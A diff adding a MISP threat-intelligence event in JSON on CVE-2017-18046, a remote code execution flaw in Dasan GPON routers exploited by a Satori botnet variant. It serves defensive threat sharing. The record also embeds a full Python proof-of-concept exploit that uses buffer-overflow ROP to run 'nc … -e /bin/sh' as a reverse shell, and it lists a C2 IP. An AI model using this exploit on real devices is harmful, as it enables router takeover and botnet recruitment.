@@ -1,0 +1,141 @@
+{
+  "Event": {
+    "date": "2018-02-11",
+    "timestamp": "1518404418",
+    "analysis": "2",
+    "uuid": "5a8042be-fe8c-4071-a140-414502de0b81",
+    "published": true,
+    "extends_uuid": "",
+    "publish_timestamp": "1518772005",
+    "info": "OSINT - Dasan Unauthenticated Remote Code Execution - and ongoing abuse",
+    "threat_level_id": "3",
+    "Orgc": {
+      "uuid": "55f6ea5e-2c60-40e5-964f-47a8950d210f",
+      "name": "CIRCL"
+    },
+    "Tag": [
+      {
+        "colour": "#ffffff",
+        "name": "tlp:white"
+      },
+      {
+        "colour": "#0088cc",
+        "name": "misp-galaxy:tool=\"Mirai\""
+      },
+      {
+        "colour": "#0088cc",
+        "name": "misp-galaxy:tool=\"Satori\""
+      }
+    ],
+    "Attribute": [
+      {
+        "category": "External analysis",
+        "timestamp": "1518355147",
+        "comment": "",
+        "uuid": "5a8042cb-c228-4acf-b07c-0f8502de0b81",
+        "value": "https://blogs.securiteam.com/index.php/archives/3552",
+        "to_ids": false,
+        "type": "link",
+        "deleted": false,
+        "disable_correlation": false
+      },
+      {
+        "category": "External analysis",
+        "timestamp": "1518355162",
+        "comment": "",
+        "uuid": "5a8042da-7704-45d1-bbf8-e31802de0b81",
+        "value": "The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146\r\n\r\nDasan Networks GPON ONT WiFi Router \u00e2\u20ac\u0153is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It\u00e2\u20ac\u2122s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.\u00e2\u20ac\u009d",
+        "to_ids": false,
+        "type": "text",
+        "deleted": false,
+        "disable_correlation": false
+      },
+      {
+        "category": "Support Tool",
+        "timestamp": "1518355218",
+        "comment": "Proof of Concept",
+        "uuid": "5a804312-adb0-417c-a89f-e30302de0b81",
+        "value": "import sys\r\nimport socket\r\nimport json\r\nimport time\r\nimport struct\r\nimport ssl\r\n\r\nif len(sys.argv) != 4:\r\n    print \"Use: {} ip port connectback\".format(sys.argv[0])\r\n    sys.exit(1)\r\n\r\nhost = str(sys.argv[1])\r\nport = int(sys.argv[2])\r\n\r\nconnectback = str(sys.argv[3])\r\n\r\nbuf = 1024\r\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n#sock.settimeout(10)\r\n\r\nclientsocket = ssl.wrap_socket(sock)\r\n#clientsocket = sock\r\nclientsocket.connect((host, port))\r\n\r\naddr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW\r\n\r\n# rop1\r\nrop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0\r\naddr_rop1 = struct.pack(\">i\",rop1)\r\n#rop2\r\nsystem = addr_libc + 0x0003CC9C     #system\r\naddr_system =  struct.pack(\">i\",system)\r\n\r\n# execute command\r\ncommand = \"nc \" + connectback + \" -e /bin/sh;\"\r\n\r\npayload = \"A\"*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command\r\n\r\ndata = \"action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\\r\\n\".format(payload)\r\n\r\nhttp_payload = \"\"\"POST /cgi-bin/login_action.cgi HTTP/1.1\\r\\nHost: 192.168.1.100:8080\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\\r\\nConnection: keep-alive\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: {}\\r\\n\\r\\n{}\"\"\".format(len(data),data)\r\n\r\nprint http_payload\r\n\r\nclientsocket.send(http_payload)\r\n\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\n\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\n\r\nclientsocket.close()",
+        "to_ids": false,
+        "type": "text",
+        "deleted": false,
+        "disable_correlation": false
+      },
+      {
+        "category": "Payload delivery",
+        "timestamp": "1518355249",
+        "comment": "",
+        "uuid": "5a804331-b9bc-4a13-858b-43dd02de0b81",
+        "value": "CVE-2017-18046",
+        "to_ids": false,
+        "type": "vulnerability",
+        "deleted": false,
+        "disable_correlation": false
+      },
+      {
+        "category": "Network activity",
+        "timestamp": "1518355285",
+        "comment": "C2 (download of the first stage)",
+        "uuid": "5a804355-8cb0-415c-ade6-a4c602de0b81",
+        "value": "185.62.188.88",
+        "to_ids": true,
+        "type": "ip-dst",
+        "deleted": false,
+        "disable_correlation": false
+      }
+    ],
+    "Object": [
+      {
+        "timestamp": "1518355428",
+        "name": "microblog",
+        "sharing_group_id": "0",
+        "uuid": "5a8043e4-7688-48d5-b395-e35002de0b81",
+        "comment": "",
+        "description": "Microblog post like a Twitter tweet or a post on a Facebook wall.",
+        "meta-category": "misc",
+        "distribution": "5",
+        "template_version": "4",
+        "template_uuid": "8ec8c911-ddbe-4f5b-895b-fbff70c42a60",
+        "deleted": false,
+        "Attribute": [
+          {
+            "category": "Other",
+            "object_relation": "post",
+            "timestamp": "1518355428",
+            "comment": "",
+            "uuid": "5a8043e4-51a4-42d0-9fdb-e35002de0b81",
+            "value": "So a brand new satori variant is causing port 8080 spike, it is looking for this new vulnerability https://blogs.securiteam.com/index.php/archives/3552 \u00e2\u20ac\u00a6 (CVE-2017-18046) , device affected \"Dasan GPON ONT WiFi Router\", new C2 is 185.62.188.88",
+            "to_ids": false,
+            "type": "text",
+            "deleted": false,
+            "disable_correlation": false
+          },
+          {
+            "category": "Other",
+            "object_relation": "type",
+            "timestamp": "1518355429",
+            "comment": "",
+            "uuid": "5a8043e5-3870-4e29-8efa-e35002de0b81",
+            "value": "Twitter",
+            "to_ids": false,
+            "type": "text",
+            "deleted": false,
+            "disable_correlation": true
+          },
+          {
+            "category": "External analysis",
+            "object_relation": "url",
+            "timestamp": "1518355429",
+            "comment": "",
+            "uuid": "5a8043e5-5690-4742-84ca-e35002de0b81",
+            "value": "https://twitter.com/360Netlab/status/962521516352077824",
+            "to_ids": true,
+            "type": "url",
+            "deleted": false,
+            "disable_correlation": false
+          }
+        ]
+      }
+    ]
+  }
+}
